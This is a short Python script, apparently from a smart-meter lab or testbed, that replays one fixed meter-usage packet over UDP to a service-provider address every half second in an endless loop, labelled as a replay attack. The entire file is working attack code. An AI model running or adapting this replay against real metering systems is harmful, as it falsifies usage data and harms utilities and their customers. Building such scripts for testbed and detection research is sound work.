

import socket
import json
import time
import sys

SP_IP = "10.0.3.1"
SP_PORT = 9999

SEND_INTERVAL = 0.5  

def run_replay(sm_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    replay_packet = {
        "smId": sm_id,
        "usage": 2.75,         
        "proto": "udp",
        "service": "-",
        "timestamp": 1720000000 
    }

    print("[*] REPLAY ATTACK STARTED")
    print("[*] Replaying identical legitimate packet")
    print(f"[*] Interval: {SEND_INTERVAL}s")
    print("-" * 50)

    while True:
        sock.sendto(json.dumps(replay_packet).encode(), (SP_IP, SP_PORT))
        time.sleep(SEND_INTERVAL)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 replay_attack.py <smId>")
        sys.exit(1)

    run_replay(sys.argv[1])
